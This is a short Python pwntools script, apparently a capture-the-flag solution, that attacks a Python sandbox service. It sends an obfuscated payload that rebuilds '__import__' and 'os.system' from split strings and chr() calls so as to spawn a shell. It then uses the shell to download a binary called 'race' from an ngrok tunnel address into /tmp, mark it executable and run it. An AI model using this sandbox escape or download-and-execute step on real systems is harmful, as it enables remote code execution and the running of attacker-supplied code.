from pwn import remote

url = "http://0.tcp.ap.ngrok.io:13272"
s = remote("localhost", 1337)

s.sendlineafter(b"> ", b"chal1")
s.sendlineafter(
    b"> ", b'__builtins__.__dict__["__imp"+chr(111)+"rt__"](chr(111)+"s").__dict__["syst"+chr(101)+"m"]("sh")'
)
s.sendline(f'python3 -c \'from urllib.request import urlretrieve;urlretrieve("{url}/race", "/tmp/race")\''.encode())

print("running")
s.sendline(b"chmod +x /tmp/race; /tmp/race")
print(s.recvline().decode().strip())
